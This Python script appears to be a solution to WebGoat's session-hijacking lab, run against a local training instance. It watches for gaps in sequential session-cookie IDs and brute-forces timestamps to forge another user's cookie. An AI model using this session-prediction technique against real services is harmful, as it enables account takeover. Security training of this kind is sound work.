import requests
import time

# Thông tin đăng nhập
username = "phamtienanh"
password = "123456"
JSESSIONID = "oGSd009rBmXyBMo5SfoPR6ncmnIRjf356X6PwHKT"

session_found_id = 0
session_found_start_time = 0
session_found_end_time = 0
previous_session_id = 0
previous_session_timestamp = 0

url = "http://localhost:8080/WebGoat/HijackSession/login/"
cookies = {"JSESSIONID": JSESSIONID}

print("================= Searching for session ==================================")

for request in range(1, 1001):
    response = requests.post(url, data={"username": username, "password": password}, cookies=cookies)
    
    if "hijack_cookie" in response.cookies:
        current_session = response.cookies["hijack_cookie"]
        current_session_id, current_session_timestamp = map(int, current_session.split('-'))
    else:
        print("Session cookie not found, retrying...")
        continue
    
    print(f"{current_session_id} - {current_session_timestamp}")
    
    if previous_session_id and (current_session_id - previous_session_id == 2):
        print(f"\nSession found: {previous_session_id} - {current_session_id}\n")
        session_found_id = previous_session_id + 1
        session_found_start_time = previous_session_timestamp
        session_found_end_time = current_session_timestamp
        break
    
    previous_session_id = current_session_id
    previous_session_timestamp = current_session_timestamp

print(f"\n================= Session Found: {session_found_id} =================\n")
print(f"| From timestamps {session_found_start_time} to {session_found_end_time} |")
print(f"================= Starting session for {session_found_id} at {session_found_start_time} =================\n")

for timestamp in range(session_found_start_time, session_found_end_time + 1):
    hijack_cookie = f"{session_found_id}-{timestamp};secure"
    cookies["hijack_cookie"] = hijack_cookie
    
    response = requests.post(url, data={"username": username, "password": password}, cookies=cookies)
    feedback = response.text.split("feedback:")[1] if "feedback:" in response.text else "No feedback"
    
    print(f"{session_found_id}-{timestamp}: {feedback}")
